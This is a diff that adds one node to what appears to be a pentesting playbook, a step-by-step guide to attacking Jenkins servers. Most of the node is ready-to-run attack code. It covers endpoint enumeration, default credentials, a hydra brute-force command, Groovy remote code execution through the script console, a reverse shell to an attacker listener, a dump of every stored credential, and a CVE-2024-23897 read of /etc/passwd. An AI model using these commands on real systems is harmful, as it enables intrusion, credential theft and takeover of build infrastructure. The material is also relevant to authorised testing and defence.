@@ -1,0 +1,26 @@
+{
+  "id": "jenkins",
+  "phase": "WEB",
+  "title": "Jenkins (8080/8443)",
+  "body": "CI/CD server = code execution by design. Script console is RCE if you can reach it. Check anonymous access first — many dev instances skip auth entirely.",
+  "cmd": "nmap -p 8080,8443 -sV $ip\ncurl -s http://$ip:8080/api/json | jq .\ncurl -s http://$ip:8080/script          # admin-only but worth trying\ncurl -s http://$ip:8080/asynchPeople/   # user list (sometimes open)\n\n# Default creds: admin:admin  admin:jenkins  jenkins:jenkins\n# Brute force login\nhydra -l admin -P rockyou.txt $ip http-post-form \\\n  \"/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:F=loginError\"\n\n# Script console RCE (Groovy) — once authenticated\n# http://$ip:8080/script\ndef cmd = \"id\"\ndef proc = cmd.execute()\nproc.waitForOrKill(1000)\nprintln proc.text\n\n# Reverse shell via script console\nString host=\"$lhost\"; int port=$lport; String cmd2=\"/bin/bash\"\nProcess p=new ProcessBuilder(cmd2).redirectErrorStream(true).start()\nSocket s=new Socket(host,port)\n[p.inputStream,s.inputStream].each { it.eachByte { s.outputStream.write(it) } }\n\n# Dump stored credentials (script console)\ndef creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(\n  com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials.class,\n  Jenkins.instance, null, null)\ncreds.each { println it.id + \":\" + it.username + \":\" + it.password }\n\n# CVE-2024-23897 — arbitrary file read (Jenkins < 2.441)\njava -jar jenkins-cli.jar -s http://$ip:8080/ help \"@/etc/passwd\"",
+  "warn": "Script console RCE runs as the Jenkins service user — often jenkins or root. Check for SSH keys and AWS creds in credential store.",
+  "choices": [
+    {
+      "label": "Anonymous script console — got RCE",
+      "next": "reverse_shell"
+    },
+    {
+      "label": "Authenticated — dumped stored creds",
+      "next": "creds_found"
+    },
+    {
+      "label": "CVE-2024-23897 file read — found creds",
+      "next": "creds_found"
+    },
+    {
+      "label": "Need creds — brute force login",
+      "next": "bruteforce"
+    }
+  ]
+}
